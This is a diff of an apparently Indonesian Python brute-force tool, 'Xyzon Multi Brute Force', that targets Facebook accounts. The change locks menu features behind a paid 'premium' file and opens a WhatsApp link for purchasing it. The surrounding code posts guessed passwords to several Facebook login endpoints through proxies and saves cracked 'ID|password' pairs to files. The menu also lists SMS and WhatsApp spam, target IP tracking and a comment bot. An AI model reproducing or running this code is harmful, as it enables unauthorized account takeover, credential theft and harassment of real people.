@@ -989,24 +989,25 @@ def menu(my_name,my_id):
 	banner()
 	ip = requests.get("https://api.ipify.org").text
 	xyzondev.append(panel(f'[bold white][[bold green]+[/][bold white]][/] [bold cyan] Username : [bold yellow]{my_name}[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]User Idz : [bold yellow]{my_id}[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]User Ip  : [bold yellow]{ip}[/][/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Tanggal  : [bold yellow]{tgl} {bln} {thn}[/][/] ',width=43,title=f"",style=f"bold red"))
-	xyzondev.append(panel(f'[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Author : [bold green]Xyzon Dev[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]NameSC : [bold green]Xyzon Multi Brute Force[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Versi  : [bold green]2.8[/][/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Status : [bold green]Premium[/][/] ',width=44,title=f"",style=f"bold red"))
+	xyzondev.append(panel(f'[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Author : [bold green]Xyzon Dev[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]NameSC : [bold green]Xyzon Multi Brute Force[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Versi  : [bold green]2.8[/][/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Status : [bold red]Not Premiun[/][/] ',width=44,title=f"",style=f"bold red"))
 	wa.print(Columns(xyzondev))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/]. [bold cyan]Crack ID From Pubilc Friends                 [bold white][[bold green]11[/][bold white]][/]. [bold cyan]Chekpoint Detector \n[bold white][[bold green]02[/][bold white]][/]. [bold cyan]Crack ID From Massal                         [bold white][[bold green]12[/][bold white]][/]. [bold cyan]Gets Headers \n[bold white][[bold green]03[/][bold white]][/]. [bold cyan]Crack ID From Username                       [bold white][[bold green]13[/][bold white]][/]. [bold cyan]Lacak IP Target \n[bold white][[bold green]04[/][bold white]][/]. [bold cyan]Crack ID From Member Grup                    [bold white][[bold green]14[/][bold white]][/]. [bold cyan]Spam Sms Target \n[bold white][[bold green]05[/][bold white]][/]. [bold cyan]Crack ID From Followers                      [bold white][[bold green]15[/][bold white]][/]. [bold cyan]Spam WhatsApp Target \n[bold white][[bold green]06[/][bold white]][/]. [bold cyan]Crack ID From Email Target                   [bold white][[bold green]16[/][bold white]][/]. [bold cyan]Bot Komen Facebook \n[bold white][[bold green]07[/][bold white]][/]. [bold cyan]Crack ID From File Kita                      [bold white][[bold green]17[/][bold white]][/]. [bold cyan]Get Data Pengguna \n[bold white][[bold green]08[/][bold white]][/]. [bold cyan]Crack ID From Nomor Target                   [bold white][[bold green]18[/][bold white]][/]. [bold cyan]Ingfo Author [bold yellow]XMBF \n[bold white][[bold green]09[/][bold white]][/]. [bold cyan]Crack ID From Komen Target                   [bold white][[bold green]19[/][bold white]][/]. [bold cyan]Report Bug Script\n[bold white][[bold green]10[/][bold white]][/]. [bold cyan]Check ID Hasil Crack                         [bold white][[bold red]00[/][bold white]][/]. [bold red]Hapus Cookies [/]',width=90,title=f"[bold red][[bold green] List Menu [bold red]]",style=f"bold red"))
+	cetak(panel(f'\t\t[bold red]Anda Belum Premium',width=90,style=f"bold red"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/]. [bold cyan]Crack ID From Pubilc Friends                 [bold white][[bold green]11[/][bold white]][/]. [bold cyan]Chekpoint Detector \n[bold white][[bold green]02[/][bold white]][/]. [bold cyan]Crack ID From Massal                         [bold white][[bold green]12[/][bold white]][/]. [bold cyan]Gets Headers \n[bold white][[bold green]03[/][bold white]][/]. [bold cyan]Crack ID From Username                       [bold white][[bold green]13[/][bold white]][/]. [bold cyan]Lacak IP Target \n[bold white][[bold green]04[/][bold white]][/]. [bold cyan]Crack ID From Member Grup                    [bold white][[bold green]14[/][bold white]][/]. [bold cyan]Spam Sms Target \n[bold white][[bold green]05[/][bold white]][/]. [bold cyan]Crack ID From Followers                      [bold white][[bold green]15[/][bold white]][/]. [bold cyan]Spam WhatsApp Target \n[bold white][[bold green]06[/][bold white]][/]. [bold cyan]Crack ID From Email Target                   [bold white][[bold green]16[/][bold white]][/]. [bold cyan]Bot Komen Facebook \n[bold white][[bold green]07[/][bold white]][/]. [bold cyan]Crack ID From File Kita                      [bold white][[bold green]17[/][bold white]][/]. [bold cyan]Get Data Pengguna \n[bold white][[bold green]08[/][bold white]][/]. [bold cyan]Crack ID From Nomor Target                   [bold white][[bold green]18[/][bold white]][/]. [bold cyan]Ingfo Author [bold yellow]XMBF \n[bold white][[bold green]09[/][bold white]][/]. [bold cyan]Crack ID From Komen Target                   [bold white][[bold green]19[/][bold white]][/]. [bold cyan]Report Bug Script\n[bold white][[bold green]10[/][bold white]][/]. [bold cyan]Check ID Hasil Crack                         [bold white][[bold red]00[/][bold white]][/]. [bold red]Hapus Cookies [/]\n\t\t[bold white][[bold green]file[/][bold white]][/]. [bold cyan]Beli File Premium [bold green]100k [/]',width=90,title=f"[bold red][[bold green] List Menu [bold red]]",style=f"bold red"))
 	_____xyzon___xd____ = input(f' {P}[{H}+{P}] \33[1;96mPilih Menu Crack \x1b[1;91m> {P}')
 	if _____xyzon___xd____ in ['1','01']:
-		xyzoncrackpublik()
+		vvk()
 	elif _____xyzon___xd____ in ['2','02']:
-		dump_massal()
+		vvk()
 	elif _____xyzon___xd____ in ['3','03']:
-		crack_nama()
+		vvk()
 	elif _____xyzon___xd____ in('4','04'):
-		crack_group()
+		vvk()
 	elif _____xyzon___xd____ in('5','05'):
-		pengikut()
+		vvk()
 	elif _____xyzon___xd____ in('6','06'):
-		crack_email()
+		vvk()
 	elif _____xyzon___xd____ in('7','07'):
-		crack_file()
+		vvk()
 	elif _____xyzon___xd____ in('8','08'):
 		crack_nomor()
 	elif _____xyzon___xd____ in('9','09'):
@@ -1014,7 +1015,7 @@ def menu(my_name,my_id):
 	elif _____xyzon___xd____ in('10','010'):
 		result()
 	elif _____xyzon___xd____ in('11','011'):
-		file_cp()
+		vvk()
 	elif _____xyzon___xd____ in('12','012'):
 		siu()
 	elif _____xyzon___xd____ in('13','013'):
@@ -1024,9 +1025,9 @@ def menu(my_name,my_id):
 	elif _____xyzon___xd____ in('15','015'):
 		spam_wa()
 	elif _____xyzon___xd____ in('16','016'):
-		memeklovekontolmekarid()
+		vvk()
 	elif _____xyzon___xd____ in('17','017'):
-		GetData()
+		vvk()
 	elif _____xyzon___xd____ in('18','018'):
 		info_ngentod()
 	elif _____xyzon___xd____ in('19','019'):
@@ -1042,13 +1043,18 @@ def menu(my_name,my_id):
 		jalan(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]{m} Sukses Menghapus Data Script{x}')
 		time.sleep(5)
 		login123()
+	elif _____xyzon___xd____ in('file'):
+		error()
 	else:
 		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Pilih Yang Bener Asu ')
 		back()
+def vvk():
+	print(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Maaf Anda Belum Premium Silahkan Beli File Premium Ke Admin')
 def error():
-	print(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Maaf Fitur Ini Masih Di Perbaiki')
-	time.sleep(4)
-	back() 
+	print(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Maaf Anda Belum Premium Silahkan Beli File Premium Ke Admin')
+	os.system("xdg-open https://wa.me/+6282183929059?text=Asalammualikum+Bang+Saya+Mau+Beli+File+Sc+Premium+Mu+Bang+Yang+100k")
+	time.sleep(3)
+	exit()
 #----------------HEADERSS-----------------#
 def siu():
 	start()
@@ -2284,7 +2290,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold white]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -2343,7 +2349,7 @@ def crackbapi(idf,pwv):
 			po = ses.post('https://developers.facebook.com/login/device-based/regular/login/?api_key=793139305026776&auth_token=0b6ec682004f184c19b735a0633758a7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&refsrc=deprecated&app_id=793139305026776&cancel=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold white]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -2405,7 +2411,7 @@ def crackmbasic(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold white]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				os.popen("play-audio data/audio/data_audio_cp.mp3")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -2450,7 +2456,7 @@ def crackfree(idf,pwv):
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold white]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -2512,7 +2518,7 @@ def crackasync(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold white]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -2574,7 +2580,7 @@ def crackreguler(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold white]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -3134,4 +3140,4 @@ if __name__=='__main__':
 	time.sleep(3)
 	login()
   
-# jangan Di Dec Anjing 
+# jangan Di Dec Anjing
